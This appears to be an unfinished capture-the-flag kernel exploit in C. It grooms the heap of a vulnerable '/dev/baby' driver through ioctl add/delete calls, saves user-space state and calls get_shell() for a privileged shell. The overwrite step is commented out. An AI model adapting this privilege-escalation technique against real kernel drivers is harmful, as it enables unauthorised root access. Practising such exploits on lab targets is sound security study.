// author: @eastXueLian
// usage : eval $buildPhase
// You can refer to my nix configuration for detailed information.

#include "libLian.h"

extern size_t user_cs, user_ss, user_rflags, user_sp;

int fd;

void add(size_t data) {
    size_t tmp[4] = {0, data};
    ioctl(fd, 0x2333, tmp);
}

void delet(size_t data) {
    size_t tmp[4] = {2, data};
    ioctl(fd, 0x2333, tmp);
}

void edit(size_t data, const size_t* input) {
    size_t tmp[4] = {1, data, (size_t)input};
    ioctl(fd, 0x2333, tmp);
}

int main() {
    save_status();

    fd = open("/dev/baby", 2);

    add(0x80);
    add(0x90);
    add(0xa0);
    add(0xb0);
    delet(0);
    add(0xc0);
    add(0x70);
    // size_t data = {0xdeadbeef, 0xcafecafe};
    // edit(0xc0, data);


    get_shell();
    return 0;
}
